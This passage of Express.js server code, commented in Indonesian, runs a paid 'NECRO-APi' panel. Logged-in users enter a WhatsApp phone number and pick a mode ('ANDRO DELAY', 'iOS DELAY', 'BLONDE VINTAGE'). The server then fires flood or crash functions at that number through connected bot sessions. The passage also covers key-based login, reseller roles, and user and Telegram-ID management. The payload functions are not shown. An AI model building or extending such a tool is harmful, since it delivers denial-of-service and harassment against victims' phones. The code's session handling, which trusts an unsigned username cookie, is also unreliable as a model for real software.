  if (req.cooldownError) {
    return res.status(429).json({
      success: false,
      message: req.cooldownError,
      username,
      expired,
    });
  }

  const targetNumber = req.query.target;
  const mode = req.query.mode;
  const target = targetNumber ? `${targetNumber}@s.whatsapp.net` : null;

  // ✅ cek sesi bot aktif
  if (sessions.size === 0) {
    return res.status(503).json({
      success: false,
      message: "🚧 Server maintenance. Tunggu sampai selesai.",
      username,
      expired,
    });
  }

  // ✅ validasi input
  if (!targetNumber) {
    return res.status(400).json({
      success: false,
      message: "Masukkan nomor target (62xxxxxxxxxx).",
      username,
      expired,
    });
  }

  if (!/^\d+$/.test(targetNumber)) {
    return res.status(400).json({
      success: false,
      message: "Nomor harus angka dan diawali dengan kode negara.",
      target: targetNumber,
      username,
      expired,
    });
  }

  if (!["andros", "ios", "fcios"].includes(mode)) {
    return res.status(400).json({
      success: false,
      message: "Mode tidak dikenali. Gunakan mode=andros / ios / fcios.",
      username,
      expired,
    });
  }

  // ✅ eksekusi
  try {
    if (mode === "andros") {
      DelayAndro(24, target);
    } else if (mode === "ios") {
      iosflood(24, target);
    } else if (mode === "fcios") {
      GetSuZoXAndros(24, target);
    }

    return res.json({
      success: true,
      message: `✅ Eksekusi sukses! Mode: ${mode.toUpperCase()}`,
      target: targetNumber,
      username,
      expired,
      timestamp: new Date().toLocaleString("id-ID"),
    });
  } catch (err) {
    return res.status(500).json({
      success: false,
      message: err.message || "Terjadi kesalahan saat eksekusi.",
      target: targetNumber,
      username,
      expired,
    });
  }
});

app.get('/status', (req, res) => {
  const sessionPath = path.join(__dirname, 'auth');
  let connected = false;

  if (fs.existsSync(sessionPath)) {
    const files = fs.readdirSync(sessionPath);
    connected = files.length > 0;
  }

  res.json({ connected });
});


const executionPage = (
  status = "🟪 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>NECRO-APi</title>
  <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
  <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
 <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(-45deg, #200000, #660000, #200000, #440000);
      background-size: 400% 400%;
      animation: gradientMove 12s ease infinite;
      color: white;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      overflow: hidden;
      position: relative;
    }
    @keyframes gradientMove {
      0%   { background-position: 0% 50%; }
      25%  { background-position: 50% 100%; }
      50%  { background-position: 100% 50%; }
      75%  { background-position: 50% 0%; }
      100% { background-position: 0% 50%; }
    }
    .container {
      z-index: 1;
      background: rgba(255, 0, 0, 0.04);
      border: 1px solid rgba(255, 0, 0, 0.1);
      backdrop-filter: blur(8px);
      padding: 24px;
      border-radius: 20px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 0 20px #ff3d3d, 0 0 40px #ff450033;
      position: relative;
    }
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 12px;
      display: block;
      border-radius: 50%;
      box-shadow: 0 0 16px #ff3d3d;
      object-fit: cover;
    }
    .username {
      font-size: 22px;
      color: #ffffff;
      font-weight: 600;
      text-align: center;
      margin-bottom: 6px;
    }
    .connected, .disconnected {
      font-size: 14px;
      margin-bottom: 16px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .connected::before, .disconnected::before {
      content: '';
      width: 10px;
      height: 10px;
      border-radius: 50%;
      display: inline-block;
      margin-right: 8px;
    }
    .connected { color: #ffffffff; } 
    .connected::before { background: #00ff00; }
    .disconnected { color: #ffffffff; }
    .disconnected::before { background: #ff3d3d; }

    /* Input dan tombol umum */
  .input-field, 
  .dropbtn, 
  .execute-button {
    width: 100%;
    padding: 12px;
    font-size: 14px;
    font-weight: 600;
    border-radius: 10px;
    border: 2px solid #ff3d3d33;
    background-color: #1a0000;
    color: #fff;
    box-sizing: border-box;
  }

  /* Dropdown */
  .dropdown {
    position: relative;
    width: 100%; /* sama panjang dengan input */
    margin-top: 10px;
  }

  .dropbtn {
    cursor: pointer;
    text-align: left;
    display: flex;
    align-items: center;
    gap: 8px;
    justify-content: flex-start;
  }

  /* Konten dropdown */
  .dropdown-content {
    display: none;
    position: absolute;
    top: 110%;
    left: 0;
    width: 100%; /* biar sama panjang */
    background-color: #1a0000;
    border: 2px solid #ff3d3d33;
    border-radius: 10px;
    z-index: 99;
    flex-direction: column;
    padding: 5px 0;
  }

  .dropdown-content button {
    width: 100%;
    padding: 10px 14px;
    background: transparent;
    border: none;
    color: #fff;
    text-align: left;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 14px;
  }

  .dropdown-content button:hover {
    background-color: #330000;
  }

  /* Execute button */
  .execute-button {
    margin-top: 10px;
    background-color: #ff3d3d;
    cursor: not-allowed;
    opacity: 0.7;
  }

  .execute-button.active {
    cursor: pointer;
    opacity: 1;
  }

    .footer-action-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-top: 20px;
    }
    .footer-button {
      background: rgba(255, 0, 0, 0.15);
      border: 1px solid #ff3d3d;
      border-radius: 8px;
      padding: 8px 12px;
      font-size: 14px;
      color: #fff;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: background 0.3s ease;
    }
    .footer-button:hover { background: rgba(236, 35, 35, 0.3); box-shadow: 0 0 16px #ff3d3d; }
    .footer-button a {
      text-decoration: none;
      color: #fff;
      display: flex;
      align-items: center;
      gap: 6px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="img/tredict.jpg" alt="Logo" class="logo" />
    <div class="username">Welcome, ${username || 'Anonymous'}</div>
    <div id="botStatus" class="disconnected">NOT CONNECTED</div>

<!-- Input -->
  <input type="text" class="input-field" placeholder="Masukkan nomor target..." />

  <!-- Dropdown -->
  <div class="dropdown">
    <button id="showModesBtn" class="dropbtn" type="button">
      <i class="fas fa-cogs"></i> Pilih Mode
    </button>
    <div class="dropdown-content" id="modesContainer">
      <button class="mode-btn" data-mode="andros"><i class="fa fa-fire"></i> ANDRO DELAY</button>
      <button class="mode-btn" data-mode="ios"><i class="fa fa-tint"></i> iOS DELAY</button>
      <button class="mode-btn" data-mode="fcios"><i class="fa fa-bolt"></i> BLONDE VINTAGE</button>
    </div>
  </div>

  <!-- Tombol eksekusi -->
  <button id="executeBtn" class="execute-button" disabled>EXECUTE</button>

    <div class="footer-action-container">
      <div class="footer-button developer">
        <a href="https://t.me/Xatanicvxii" target="_blank">
          <i class="fab fa-telegram"></i> Developer
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Unknown'}
        &nbsp;|&nbsp;
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>

    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
   <script>
function updateBotStatus() {
  fetch('/status')
    .then(res => res.json())
    .then(data => {
      const botStatusEl = document.getElementById('botStatus');
      if (data.connected) {
        botStatusEl.textContent = "CONNECTED";
        botStatusEl.classList.remove("disconnected");
        botStatusEl.classList.add("connected");
      } else {
        botStatusEl.textContent = "NOT CONNECTED";
        botStatusEl.classList.remove("connected");
        botStatusEl.classList.add("disconnected");
      }
    })
    .catch(() => {
      const botStatusEl = document.getElementById('botStatus');
      botStatusEl.textContent = "ERROR";
      botStatusEl.classList.remove("connected");
      botStatusEl.classList.add("disconnected");
    });
}

// cek pertama kali pas halaman dibuka
updateBotStatus();

// auto refresh status setiap 5 detik
setInterval(updateBotStatus, 5000);
</script>

  <script>
// 🔘 Mode select
const inputField = document.querySelector('input[type="text"]');
const executeBtn = document.getElementById('executeBtn');
const dropdownContent = document.querySelector('.dropdown-content');
const dropdownBtn = document.querySelector('.dropbtn');
let selectedMode = null;

// event listener untuk semua item dropdown
document.querySelectorAll('.dropdown-content button').forEach(item => {
  item.addEventListener('click', function () {
    // simpan mode yg dipilih
    selectedMode = this.getAttribute('data-mode');
    
    // ubah text tombol utama sesuai pilihan
    dropdownBtn.innerHTML = this.innerHTML;

    // aktifkan tombol EXECUTE
    executeBtn.disabled = false;
    executeBtn.classList.add("active");

    // tutup dropdown
    dropdownContent.style.display = "none";
  });
});

// buka/tutup dropdown saat tombol ditekan
dropdownBtn.addEventListener('click', function () {
  dropdownContent.style.display =
    dropdownContent.style.display === "block" ? "none" : "block";
});

// 🚀 Eksekusi
executeBtn.addEventListener('click', () => {
  const number = inputField.value.trim();

  fetch('/status')
    .then(res => res.json())
    .then(data => {
      if (!data.connected) {
        return Swal.fire({ icon: 'error', title: 'Bot belum terhubung', text: 'Pastikan ada bot WhatsApp yang aktif.' });
      }
      return fetch("/execution/run?mode=" + selectedMode + "&target=" + number, {
        headers: { "Accept": "application/json" }
      });
    })
    .then(async res => {
      if (!res) return;
      const data = await res.json();

      if (!res.ok || !data.success) {
        Swal.fire({ icon: 'error', title: 'Cooldown', text: data.message || 'Tunggu sebentar sebelum eksekusi lagi.' });
        return;
      }

      Swal.fire({ icon: 'success', title: 'Success', text: data.message, showConfirmButton: false, timer: 1500 });
    })
    .catch(() => {
      Swal.fire({ icon: 'error', title: 'Gagal Eksekusi', text: 'Terjadi kesalahan saat menghubungi server.' });
    });
});

// close dropdown jika klik di luar
window.addEventListener("click", function (e) {
  if (!e.target.closest('.dropdown')) {
    dropdownContent.style.display = "none";
  }
});
</script>
</body>
</html>`;
};


// Appp Get root Server \\
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "Tredict-View", "First-View.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca First-View.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "Tredict-View", "Login.html");

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    res.send(html);
  });
});


app.post("/auth", (req, res) => {
  const { username, key, deviceId } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);

  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  if (Date.now() > user.expired) {
    return res.redirect("/login?msg=" + encodeURIComponent("Key sudah expired!"));
  }

  if (user.deviceId && user.deviceId !== deviceId) {
    return res.redirect("/login?msg=" + encodeURIComponent("Perangkat tidak dikenali!"));
  }

  if (!user.deviceId) {
    user.deviceId = deviceId;
    saveUsers(users);
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });

  // 🔹 Role yang bisa akses dashboard
  const dashboardRoles = ["owner", "admin", "vip"];
  if (dashboardRoles.includes(user.role)) {
    return res.redirect("/dashboard");
  }

  res.redirect("/execution");
});

function convertDaysToTimestamp(days) {
  return Date.now() + days * 24 * 60 * 60 * 1000;
}

app.post("/add-user", express.urlencoded({ extended: true }), (req, res) => {
  const sessionUser = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === sessionUser);

  if (!currentUser) {
    return res.status(403).send("Akses ditolak");
  }

  const { username, role, expired } = req.body;

  // 🔹 Role yang boleh dibuat sesuai role login
  let allowedRoles = [];
  if (currentUser.role === "owner") {
    allowedRoles = ["admin", "vip", "user"];
  } else if (currentUser.role === "admin") {
    allowedRoles = ["vip", "user"];
  } else if (currentUser.role === "vip") {
    allowedRoles = ["user"];
  } else {
    return res.status(403).send("Akses ditolak");
  }

  // Validasi role yang dikirim
  if (!allowedRoles.includes(role)) {
    return res.status(400).send("Role tidak valid untuk kamu");
  }

  const key = generateKey();
  const expiredTimestamp = convertDaysToTimestamp(Number(expired));

  users.push({
    username,
    key,
    role,
    expired: expiredTimestamp,
    deviceId: ""
  });

  saveUsers(users);
  res.redirect("/dashboard");
});


// Edit User
app.post("/edit-user", express.json(), (req, res) => {
  const sessionUser = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === sessionUser);
  if (!currentUser) return res.status(403).send("Akses ditolak");

  let { index, username, role, expired, deviceId } = req.body;
  index = Number(index);

  if (!users[index]) return res.status(404).send("User tidak ditemukan");

  // 🔹 Role yang boleh diedit sesuai role login
  let allowedRoles = [];
  if (currentUser.role === "owner") {
    allowedRoles = ["owner", "admin", "vip", "user"];
  } else if (currentUser.role === "admin") {
    allowedRoles = ["vip", "user"];
  } else if (currentUser.role === "vip") {
    allowedRoles = ["user"];
  }

  if (!allowedRoles.includes(role)) {
    return res.status(400).send("Role tidak valid untuk kamu");
  }

  let newExpired = Number(expired);
  if (newExpired < 1000000000000) {
    newExpired = Date.now() + newExpired * 24 * 60 * 60 * 1000;
  }

  users[index] = {
    ...users[index],
    username,
    role,
    expired: newExpired,
    deviceId
  };

  saveUsers(users);
  res.sendStatus(200);
});

// Hapus User
app.post("/delete-user", express.json(), (req, res) => {
  let { index } = req.body;
  index = Number(index);

  const users = getUsers();
  if (!users[index]) return res.status(404).send("User tidak ditemukan");

  const username = req.cookies.sessionUser; // User yang login sekarang
  const currentUser = users.find(u => u.username === username);
  const targetUser = users[index];

  if (!currentUser) return res.status(403).send("Session tidak valid");

  // Aturan hapus
  if (currentUser.role === "vip" && (targetUser.role === "owner" || targetUser.role === "admin")) {
    return res.status(403).send("❌ VIP tidak boleh menghapus Owner/Admin");
  }
  if (currentUser.role === "admin" && targetUser.role === "owner") {
    return res.status(403).send("❌ Admin tidak boleh menghapus Owner");
  }

  // Owner bisa hapus semua
  users.splice(index, 1);
  saveUsers(users);
  res.sendStatus(200);
});

app.get("/dashboard", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.send("❌ Session tidak ditemukan.");

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  if (!currentUser) return res.send("❌ User tidak valid.");

  // === Batasan akses ===
  const allowedRoles = ["owner", "admin", "vip"];
  if (!allowedRoles.includes(currentUser.role)) {
    return res.status(403).send("❌ Kamu tidak punya akses ke halaman ini.");
  }

  // === Opsi role di form Add User ===
const roleOptionsByRole = {
  vip: ["user"],
  admin: ["vip", "user"],
  owner: ["admin", "vip", "user"]
};

const roleOptionsForForm = roleOptionsByRole[currentUser.role]
  .map(role => `<option value="${role}">${role.charAt(0).toUpperCase() + role.slice(1)}</option>`)
  .join("");

const roleOptionsHTML = (selectedRole, isCurrentUserVip, userRole) => {
  // Jika yang login vip, dan user yang dirender adalah owner/admin/vip, 
  // maka dropdown hanya punya 1 pilihan "user", tapi kalau role user adalah owner/admin/vip maka tampilkan juga optionnya sebagai disabled agar tidak hilang dari tampilan.
  if (isCurrentUserVip) {
    // Jika user di data punya role owner/admin/vip, tampilkan option itu tapi disabled (tidak bisa dipilih),
    // dan juga tampilkan option user yang bisa dipilih.
    if (["owner", "admin", "vip"].includes(userRole)) {
      // Buat option sesuai role user tapi disabled
      const specialOption = `<option value="${userRole}" selected disabled>${userRole.charAt(0).toUpperCase() + userRole.slice(1)}</option>`;
      // Plus option user biasa yang bisa dipilih (tidak selected)
      const userOption = `<option value="user" ${selectedRole === "user" ? "selected" : ""}>User</option>`;
      return specialOption + userOption;
    } else {
      // Kalau role biasa (user), tampilkan cuma option user saja
      return `<option value="user" selected>User</option>`;
    }
  } else {
    // Jika bukan vip (admin/owner)
    return roleOptionsByRole[currentUser.role]
      .map(
        role =>
          `<option value="${role}" ${selectedRole === role ? "selected" : ""}>${role.charAt(0).toUpperCase() + role.slice(1)}</option>`
      )
      .join("");
  }
};

const isVip = currentUser.role === "vip";

const userRows = users
  .map((user, i) => `
    <tr class="border-b border-red-800 hover:bg-red-800 transition" data-index="${i}">
      <td contenteditable="true" class="py-2 px-4 editable" data-field="username">${user.username}</td>
      <td class="py-2 px-4">${user.key}</td>
      <td>
        <select class="bg-transparent text-red-300 border-none focus:ring-0 p-1 role-selector" data-field="role" ${
          user.role === "owner" && currentUser.role !== "owner" ? "disabled" : ""
        }>
          ${roleOptionsHTML(user.role, isVip, user.role)}
        </select>
      </td>
      <td class="py-2 px-4" contenteditable="true" data-field="deviceId">${user.deviceId || "-"}</td>
      <td class="py-2 px-4" contenteditable="true" data-field="expired">${user.expired}</td>
      <td class="py-2 px-4 flex gap-2">
        <button class="text-blue-400 hover:text-blue-600 save-btn" title="Simpan Perubahan">Simpan</button>
        <button class="text-red-400 hover:text-red-600 delete-btn" title="Hapus User">Hapus</button>
      </td>
    </tr>
  `).join("");
  res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Dashboard - NecroPanel</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- TailwindCSS -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Font Poppins -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <!-- Particles.js -->
  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>

  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(-45deg, #200000, #660000, #200000, #440000);
      background-size: 400% 400%;
      animation: gradientMove 12s ease infinite;
    }
    @keyframes gradientMove {
      0%   { background-position: 0% 50%; }
      25%  { background-position: 50% 100%; }
      50%  { background-position: 100% 50%; }
      75%  { background-position: 50% 0%; }
      100% { background-position: 0% 50%; }
    }
    td[contenteditable="true"]:focus {
      outline: 2px solid #f43f5e;
    }

    #particles-js {
      position: fixed;
      width: 100%;
      height: 100%;
      z-index: -1;
      top: 0;
      left: 0;
    }

    #mobileMenu {
  box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
}


    /* Glow effect */
    .glow-red {
      box-shadow: 0 0 15px rgba(244, 63, 94, 0.8);
    }

    .logo-glow {
  box-shadow: 0 0 25px 5px rgba(255, 0, 72, 0.7), /* glow luar */
              0 0 10px 2px rgba(255, 0, 72, 0.5); /* glow dalam */
}


html {
  scroll-behavior: smooth;
}
  </style>
</head>
<body class="bg-black text-red-400 min-h-screen flex flex-col">
  <div id="particles-js"></div>

<!-- Navbar -->
<header class="bg-white/10 backdrop-blur-md border-b border-white/20 flex items-center justify-between px-4 h-14 fixed w-full z-50">
  <!-- Tombol burger (hanya mobile) -->
  <button id="burgerBtn" aria-label="Toggle menu"
    class="md:hidden text-red-400 hover:text-red-600 focus:outline-none flex items-center gap-1 z-50 relative">
    <svg id="burgerIcon" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none"
         viewBox="0 0 24 24" stroke="currentColor">
      <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16" />
    </svg>
  </button>

  <h1 class="hidden md:block text-xl font-bold text-red-400">Tredict Dashboard</h1>

  <!-- Desktop nav -->
  <nav class="hidden md:flex space-x-6 text-red-300">
    <a href="#overview" class="hover:text-red-600">Profile</a>
    <a href="#users" class="hover:text-red-600">Users</a>
    <a href="#add-telegram" class="hover:text-red-600">Add Id</a>
  </nav>
</header>

<!-- Overlay -->
<div id="overlay" class="hidden fixed inset-0 bg-black bg-opacity-50 z-40"></div>

<!-- Side Menu (mobile) -->
<nav id="mobileMenu"
     class="fixed top-0 left-0 h-full w-64 bg-black bg-opacity-90 border-r border-red-700 text-red-400 flex flex-col space-y-4 p-4 text-lg transform -translate-x-full transition-transform duration-300 ease-in-out z-50 md:hidden">
  <a href="#overview" class="hover:text-red-600" onclick="toggleMobileMenu()">Overview</a>
  <a href="#users" class="hover:text-red-600" onclick="toggleMobileMenu()">Users</a>
  <a href= "#add-telegram" class="hover:text-red-600" onclick="toggleMobileMenu()">Add Id</a>
</nav>

  <!-- Main Content -->
  <main class="mt-14 p-6 w-full space-y-8 flex flex-col items-center">

    <!-- Overview -->
    <section id="overview" class="text-white flex flex-col items-center w-full space-y-6">
      <!-- Logo -->
     <div class="w-[43%] aspect-square rounded-full overflow-hidden flex items-center justify-center logo-glow">
  <img src="img/tredict.jpg" 
       alt="Logo" 
       class="w-full h-full object-cover">
</div>

  <h2 class="text-2xl font-bold mb-4 w-full max-w-5xl text-red-400 text-start">Your Profile</h2>


      <!-- Info Card -->
      <div class="relative w-full max-w-5xl rounded-lg overflow-hidden shadow-lg glow-red"
       style="
       background-image: url('img/tredict.jpg');
       background-size: cover;
       background-position: center;
       box-shadow: 0 4px 20px rgba(255, 0, 0, 0.4), 0 0 15px rgba(255, 0, 0, 0.6);
     ">
      <div class="absolute inset-0 bg-black bg-opacity-70"></div>
        <div class="relative p-6 space-y-4">
          
          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <i class="fas fa-user text-red-500"></i>
              <span><b>Username:</b></span>
            </div>
            <span class="text-sm font-mono text-white">${currentUser.username}</span>
          </div>

          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <i class="fas fa-key text-red-500"></i>
              <span><b>Key:</b></span>
            </div>
            <span class="text-sm font-mono text-white">
              ${currentUser.key 
                ? (currentUser.key.includes('-') 
                    ? currentUser.key.split('-')[1] 
                    : currentUser.key).slice(0, 8) + "..."
                : "-"}
            </span>
          </div>

          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <i class="fas fa-user-shield text-red-500"></i>
              <span><b>Role:</b></span>
            </div>
            <span class="text-sm font-mono text-white">${currentUser.role}</span>
          </div>

          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <i class="fas fa-calendar-times text-red-500"></i>
              <span><b>Expired:</b></span>
            </div>
            <span class="text-sm font-mono text-white">
              ${new Date(currentUser.expired).toISOString().split('T')[0]}
            </span>
          </div>

        </div>
      </div>
    </section>

    <!-- Users -->
    <section id="users" class="w-full max-w-5xl">
      <h2 class="text-2xl font-bold mb-4">Users</h2>
      <div class="overflow-auto rounded border border-red-600 mb-4 glow-red">
        <table class="min-w-full text-left">
          <thead class="bg-red-800 text-red-200">
            <tr>
              <th class="py-2 px-4">Username</th>
              <th class="py-2 px-4">Key</th>
              <th class="py-2 px-4">Role</th>
              <th class="py-2 px-4">Device ID</th>
              <th class="py-2 px-4">Expired</th>
              <th class="py-2 px-4">Action</th>
            </tr>
          </thead>
          <tbody id="userTableBody">
            ${userRows}
          </tbody>
        </table>
      </div>
    </section>

    <!-- Add User -->
    <section id="auser" class="w-full max-w-5xl">
      <h2 class="text-2xl font-bold mb-4">Add New Users</h2>
      <form id="userForm" action="/add-user" method="POST" onsubmit="sessionStorage.setItem('userAdded', 'true')" class="space-y-4 bg-red-800 p-4 rounded glow-red">
        <div>
          <label class="block text-sm">Username</label>
          <input name="username" class="w-full p-2 rounded bg-black text-white border border-red-500" required>
        </div>
        <input type="hidden" name="key" value="${crypto.randomBytes(2).toString('hex').toUpperCase()}">
        <div>
          <label class="block text-sm">Role</label>
          <select name="role" class="w-full p-2 rounded bg-black text-white border border-red-500">
            ${roleOptionsForForm}
          </select>
        </div>
        <div>
          <label class="block text-sm">Expired (timestamp)</label>
          <input name="expired" type="number" class="w-full p-2 rounded bg-black text-white border border-red-500" required>
        </div>
        <button class="bg-red-600 px-4 py-2 rounded hover:bg-red-700 text-white" type="submit">
          <i class="fas fa-plus"></i> Tambah
        </button>
      </form>
    </section>

<!-- Add ID Telegram -->
  <section id="add-telegram" class="w-full max-w-5xl">
  <h2 class="text-2xl font-bold mb-4">Add Telegram User</h2>
  <form action="/add-telegram" method="POST" 
        class="space-y-4 bg-red-800 p-4 rounded glow-red">
    
    <div>
      <label class="block text-sm">Telegram ID</label>
      <input type="number" name="telegramId" 
             class="w-full p-2 rounded bg-black text-white border border-red-500" 
             placeholder="Masukkan ID Telegram" required>
    </div>

    <div>
      <label class="block text-sm">Role</label>
      <select name="role" class="w-full p-2 rounded bg-black text-white border border-red-500" required>
        <option value="owners">Owner</option>
        <option value="akses">Akses</option>
        <option value="admin">Admin</option>
      </select>
    </div>

    <button type="submit" 
            class="bg-red-600 px-4 py-2 rounded hover:bg-red-700 text-white">
      <i class="fas fa-plus"></i> Tambah User Telegram
    </button>
  </form>
</section>

  </main>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
  const urlParams = new URLSearchParams(window.location.search);
  const msg = urlParams.get("msg");
  const type = urlParams.get("type");

  if (msg) {
   Swal.fire({
  icon: type || "info",
  title: msg,
  background: "#1a1a1a",   // warna background (hitam/dark)
  color: "#ffffff",        // warna teks
  showConfirmButton: false,
  timer: 2500
});

    // Hapus query biar tidak muncul lagi pas refresh
    window.history.replaceState({}, document.title, window.location.pathname);
  }
</script>

  <script>
  const form = document.getElementById('userForm');

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    // simpan flag dulu
    sessionStorage.setItem('userAdded', 'true');

    Swal.fire({
      icon: 'success',
      title: 'User berhasil ditambahkan!',
      showConfirmButton: false,
      timer: 1500
    }).then(() => {
      // submit form setelah alert
      form.submit();
    });
  });
</script>

  <script>
const burgerBtn = document.getElementById('burgerBtn');
const mobileMenu = document.getElementById('mobileMenu');
const burgerIcon = document.getElementById('burgerIcon');
const overlay = document.getElementById('overlay');

function toggleMobileMenu() {
  mobileMenu.classList.toggle('-translate-x-full');
  overlay.classList.toggle('hidden');

  if (mobileMenu.classList.contains('-translate-x-full')) {
    // Kembali ke ikon burger
    burgerIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16" />';
  } else {
    // Ganti jadi ikon X
    burgerIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />';
  }
}

burgerBtn.addEventListener('click', toggleMobileMenu);
overlay.addEventListener('click', toggleMobileMenu);
</script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
document.addEventListener("DOMContentLoaded", () => {
  // Tombol hapus user
  document.querySelectorAll(".delete-btn").forEach(btn => {
    btn.addEventListener("click", () => {
      const row = btn.closest("tr");
      const index = row.dataset.index;

      Swal.fire({
        title: "Hapus User?",
        text: "Aksi ini tidak bisa dibatalkan!",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#d33",
        cancelButtonColor: "#ffffffff",
        confirmButtonText: "Ya, hapus!"
      }).then(async (result) => {
        if (!result.isConfirmed) return;

        const res = await fetch("/delete-user", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ index })
        });

        if (res.ok) {
          Swal.fire("Berhasil!", "User berhasil dihapus.", "success");
          row.remove();
        } else {
          const msg = await res.text();
          Swal.fire("Gagal!", msg, "error");
        }
      });
    });
  });

  // Tombol simpan perubahan
  document.querySelectorAll(".save-btn").forEach(btn => {
    btn.addEventListener("click", async () => {
      const row = btn.closest("tr");
      const index = row.dataset.index;

      const data = {
        index,
        username: row.querySelector('[data-field="username"]').innerText.trim(),
        role: row.querySelector(".role-selector").value,
        deviceId: row.querySelector('[data-field="deviceId"]').innerText.trim(),
        expired: row.querySelector('[data-field="expired"]').innerText.trim()
      };

      const res = await fetch("/edit-user", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      if (res.ok) {
        Swal.fire("Berhasil!", "Perubahan telah disimpan.", "success");
      } else {
        const msg = await res.text();
        Swal.fire("Gagal!", msg, "error");
      }
    });
  });
});
</script>
  </body>
  </html>
  `);
});

/*Add id telegram*/ 
app.post("/add-telegram", (req, res) => {
  const { telegramId, role } = req.body;

  if (!telegramId || !role) {
    return res.redirect(
      "/dashboard?msg=" + encodeURIComponent("❌ Telegram ID dan role wajib diisi!") + "&type=error"
    );
  }

  const idNum = Number(telegramId);

  try {
    if (role === "owners" || role === "akses") {
      const aksesPath = path.join(__dirname, "akses.json");
      let aksesData = JSON.parse(fs.readFileSync(aksesPath, "utf8"));

      if (!aksesData[role]) {
        return res.redirect(
          "/dashboard?msg=" + encodeURIComponent("❌ Role tidak valid di akses.json!") + "&type=error"
        );
      }

      if (aksesData[role].includes(idNum)) {
        return res.redirect(
          "/dashboard?msg=" + encodeURIComponent(`⚠️ ID ${idNum} sudah ada di ${role}.`) + "&type=warning"
        );
      }

      aksesData[role].push(idNum);
      fs.writeFileSync(aksesPath, JSON.stringify(aksesData, null, 2));
      return res.redirect(
        "/dashboard?msg=" + encodeURIComponent(`ID ${idNum} berhasil ditambahkan ke ${role}!`) + "&type=success"
      );
    }

    if (role === "admin") {
      const adminPath = path.join(__dirname, "database", "admin.json");
      let adminData = JSON.parse(fs.readFileSync(adminPath, "utf8"));

      if (!Array.isArray(adminData)) {
        return res.redirect(
          "/dashboard?msg=" + encodeURIComponent("❌ Format admin.json harus berupa array []") + "&type=error"
        );
      }

      if (adminData.includes(idNum)) {
        return res.redirect(
